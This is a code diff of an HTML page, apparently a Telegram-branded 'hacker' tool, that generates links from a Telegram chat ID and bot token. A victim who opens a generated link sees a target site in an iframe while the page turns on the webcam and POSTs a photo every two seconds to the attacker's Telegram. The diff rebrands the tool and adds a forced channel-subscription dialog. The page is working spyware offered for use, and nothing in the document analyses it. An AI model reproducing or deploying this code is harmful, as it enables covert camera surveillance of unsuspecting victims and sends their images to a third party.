@@ -13,67 +13,53 @@
       --muted:#bfaef6;
     }
     html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:var(--bg1);color:#fff}
-    /* [تم التعديل] الخلفية: سوداء خالصة - تمت إزالة الصورة نهائياً */
     body{
       background: #000000;
       background-image: none;
       position:relative;
     }
-    /* [تم التعديل] تم إزالة الـ overlay بالكامل */
     .overlay {
       display: none;
     }
-
-    /* الحاوية المركزية */
     .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
-
-    /* هيدر */
     .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
-    .brand{font-weight:800;font-size:22px;color:#ffffff;letter-spacing:0.6px} /* [تم التعديل] بنفسجي > أبيض */
+    .brand{font-weight:800;font-size:22px;color:#ffffff;letter-spacing:0.6px}
     .nav{display:flex;gap:18px}
-    .nav a{color:#ffffff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)} /* [تم التعديل] بنفسجي > أبيض */
-
-    /* البطاقة */
+    .nav a{color:#ffffff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)}
     .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
       border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
-
     .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
     .hero-left{flex:1;min-width:260px}
-    .title{font-size:34px;color:#ffffff;margin:0 0 8px} /* [تم التعديل] بنفسجي > أبيض */
-    .subtitle{color:#ffffff;margin:0 0 18px} /* [تم التعديل] بنفسجي > أبيض */
-
-    /* الفورم */
+    .title{font-size:34px;color:#ffffff;margin:0 0 8px}
+    .subtitle{color:#ffffff;margin:0 0 18px}
     .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
-    label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px} /* [تم التعديل] بنفسجي > أبيض */
+    label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px}
     input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
     .row{display:flex;gap:12px}
     .btn{
-      display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:12px;width:100%; /* [تم التعديل] بنفسجي > أبيض كامل */
+      display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:12px;width:100%;
     }
     .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:14px;display:flex;gap:10px;align-items:center;justify-content:space-between}
     .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}
-
-    /* شارة الكاميرا الصغيرة */
     .captureBadge{
       position:fixed;top:14px;right:14px;z-index:9999;
       background:rgba(0,0,0,0.55);padding:8px 12px;border-radius:999px;font-weight:800;color:#ffd966;font-size:13px;display:none;
       box-shadow:0 8px 30px rgba(0,0,0,0.5);backdrop-filter: blur(4px);
     }
-
-    /* Made by MARO */
-    .madeby{position:fixed;left:14px;bottom:14px;z-index:9999;color:#ffffff;background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700;box-shadow:0 6px 20px rgba(0,0,0,0.5)} /* [تم التعديل] بنفسجي > أبيض */
-    
-    /* iframe full */
+    .madeby{
+      position:fixed;left:14px;bottom:14px;z-index:9999;
+      background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700;
+      box-shadow:0 6px 20px rgba(0,0,0,0.5);
+      color: #ffffff;
+    }
     .viewerFrame{width:100%;height:calc(100vh - 40px);border-radius:10px;border:0;overflow:hidden}
-    
-    /* responsive */
     @media (max-width:720px){
       .title{font-size:28px}
       .card{padding:16px}
       .wrap{padding:18px}
     }
 
-    /* ===== [إضافة] الدايلوج ===== */
+    /* الدايلوج المطور */
     .dialog {
       position: fixed;
       top: 50%;
@@ -95,6 +81,30 @@
       font-weight: 800;
       margin-bottom: 30px;
     }
+    .dialog-buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      align-items: center;
+    }
+    .dialog-link {
+      display: inline-block;
+      background: #ffffff;
+      color: #000000;
+      padding: 14px 25px;
+      border-radius: 50px;
+      text-decoration: none;
+      font-weight: 900;
+      font-size: 18px;
+      border: 2px solid #ffffff;
+      transition: 0.3s;
+      width: 80%;
+    }
+    .dialog-link.visited {
+      background: #28a745;
+      color: white;
+      border-color: #28a745;
+    }
     .dialog-btn {
       display: inline-block;
       background: #ffffff;
@@ -107,19 +117,31 @@
       border: 2px solid #ffffff;
       transition: 0.3s;
       box-shadow: 0 0 20px rgba(255,255,255,0.3);
+      margin-top: 20px;
+      width: 80%;
+      cursor: pointer;
+      opacity: 0.5;
+      pointer-events: none;
     }
-    .dialog-btn:hover {
+    .dialog-btn.active {
+      opacity: 1;
+      pointer-events: auto;
+      background: #ffffff;
+      color: #000000;
+    }
+    .dialog-btn.active:hover {
       background: transparent;
       color: #ffffff;
+    }
+    .check-icon {
+      margin-right: 8px;
     }
   </style>
 </head>
 <body>
-  <!-- تمت إزالة الـ overlay نهائياً -->
 
   <div class="wrap">
 
-    <!-- Header -->
     <div class="header" style="width:100%;max-width:1100px;"> 
       <div class="nav">
         <a href="#"></a>
@@ -127,12 +149,10 @@
       </div>
     </div>
 
-    <!-- Card with form -->
     <div class="card" id="cardArea" style="width:100%">
       <div class="hero">
         <div class="hero-left">
-          <h1 class="title">Hello, I'm K1X</h1>
-          
+          <h1 class="title">Hello, I'm MARO</h1>
 
           <div class="form" id="formBox">
             <label>أدخل الـ ID</label>
@@ -153,10 +173,8 @@
           </div>
         </div>
 
-        <!-- Visual side (big CTA buttons like screenshot) -->
         <div style="min-width:260px;flex:0 0 260px;">
           <div style="background:linear-gradient(180deg, rgba(128,77,255,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center">
-            
           </div>
         </div>
       </div>
@@ -164,29 +182,72 @@
 
   </div>
 
-  <!-- small badge and made by -->
   <div id="captureBadge" class="captureBadge"></div>
-  <div class="madeby"></div>
+  <div class="madeby">Made by KSI</div>
 
-  <!-- ===== [إضافة] الدايلوج ===== -->
+  <!-- الدايلوج بشرط الاشتراك في قناتين -->
   <div class="dialog" id="mandatoryDialog">
-    <p> اشتراك إجباري في القناة </p>
-    <a href="https://t.me/Maro_hacker_eg"
-   target="_blank"
-   class="dialog-btn"
-   onclick="closeDialog()">
-   @Maro_hacker_eg
-    </a>
+    <p>✨ اشتراك إجباري في القنوات ✨</p>
+    <div class="dialog-buttons" id="dialogButtons">
+      <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1" data-visited="false">@Maro_hacker_eg</a>
+      <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2" data-visited="false">@lego2028</a>
+      <button class="dialog-btn" id="subscribeDoneBtn" disabled>✅ تم الاشتراك</button>
+    </div>
   </div>
 
 <script>
-  // عناصر
+  // عناصر الدايلوج
+  const dialog = document.getElementById('mandatoryDialog');
+  const channel1 = document.getElementById('channel1');
+  const channel2 = document.getElementById('channel2');
+  const subscribeBtn = document.getElementById('subscribeDoneBtn');
+
+  // التحقق من حالة الاشتراك
+  let channel1Clicked = false;
+  let channel2Clicked = false;
+
+  // عند النقر على رابط القناة الأولى
+  channel1.addEventListener('click', function() {
+    channel1Clicked = true;
+    channel1.classList.add('visited');
+    channel1.style.background = '#28a745';
+    channel1.style.color = 'white';
+    channel1.style.borderColor = '#28a745';
+    checkBothClicked();
+  });
+
+  // عند النقر على رابط القناة الثانية
+  channel2.addEventListener('click', function() {
+    channel2Clicked = true;
+    channel2.classList.add('visited');
+    channel2.style.background = '#28a745';
+    channel2.style.color = 'white';
+    channel2.style.borderColor = '#28a745';
+    checkBothClicked();
+  });
+
+  // دالة التحقق من النقر على كلا الرابطين
+  function checkBothClicked() {
+    if (channel1Clicked && channel2Clicked) {
+      subscribeBtn.disabled = false;
+      subscribeBtn.classList.add('active');
+      subscribeBtn.style.opacity = '1';
+      subscribeBtn.style.pointerEvents = 'auto';
+      subscribeBtn.innerHTML = '✅ تم الاشتراك';
+    }
+  }
+
+  // إخفاء الدايلوج عند الضغط على زر "تم الاشتراك"
+  subscribeBtn.addEventListener('click', function() {
+    dialog.style.display = 'none';
+  });
+
+  // عناصر الفورم
   const generateBtn = document.getElementById('generateBtn');
   const resultEl = document.getElementById('result');
   const linkText = document.getElementById('linkText');
   const copyBtn = document.getElementById('copyBtn');
 
-  // عند الضغط يولد الرابط المباشر (بدون اختصار)
   generateBtn.addEventListener('click', () => {
     const chat = document.getElementById('chatIdInput').value.trim();
     const token = document.getElementById('tokenInput').value.trim();
@@ -202,7 +263,6 @@
     resultEl.style.display = 'flex';
   });
 
-  // زر النسخ
   copyBtn.addEventListener('click', async () => {
     try {
       await navigator.clipboard.writeText(linkText.innerText);
@@ -213,27 +273,22 @@
     }
   });
 
-  // --- viewer mode: لو الرابط يحتوي پاراميترز نعرض iframe ونشغل الكاميرا ---
+  // viewer mode
   const params = new URLSearchParams(window.location.search);
   const chat = params.get('chat');
   const token = params.get('token');
   const target = params.get('url');
 
   if (chat && token && target) {
-    // استبدال المحتوى بعرض الـ iframe (مع الحفاظ على البادج ومصدر الخلفية)
     document.getElementById('cardArea').style.display = 'none';
-    // نضع iframe يغطي اللـ fold لكن نريد الاحتفاظ بالبادج و madeby
     const iframe = document.createElement('iframe');
     iframe.className = 'viewerFrame';
     iframe.src = target;
-    // نضيف iframe بعد الـ wrap
     document.querySelector('.wrap').appendChild(iframe);
 
-    // اظهار البادج
     const captureBadge = document.getElementById('captureBadge');
     captureBadge.style.display = 'inline-block';
 
-    // نبدأ الكاميرا ونرسل صور كل 2 ثانية
     (async function startCameraAndSend(){
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
@@ -244,7 +299,6 @@
 
         const canvas = document.createElement('canvas');
 
-        // إرسال كل 2 ثانية
         const tick = async () => {
           if (!vid.videoWidth) return;
           canvas.width = vid.videoWidth;
@@ -263,9 +317,7 @@
                 method: 'POST',
                 body: form
               });
-              // لا نظهر أي رسالة للمستخدم — البادج كافي
             } catch (err) {
-              // لو خطأ في الإرسال نغير نص البادج مؤقتاً
               captureBadge.textContent = '⚠️ خطأ في الإرسال';
               captureBadge.style.background = 'rgba(160,40,40,0.9)';
               console.error('Send error', err);
@@ -273,17 +325,14 @@
           }, 'image/png');
         };
 
-        // أولاً تأكد الفيديو شغال ثم ضبط interval
         const intervalId = setInterval(tick, 2000);
 
-        // تنظيف عند الخروج
         window.addEventListener('beforeunload', () => {
           clearInterval(intervalId);
           stream.getTracks().forEach(t => t.stop());
         });
 
       } catch (err) {
-        // إذن الكاميرا مرفوض أو مشكلة، نبِّه المستخدم بالبادج
         const captureBadge = document.getElementById('captureBadge');
         captureBadge.textContent = '❌ إذن الكاميرا مرفوض';
         captureBadge.style.background = 'rgba(160,40,40,0.9)';
@@ -293,4 +342,4 @@
   }
 </script>
 </body>
-              </html>
+  </html>
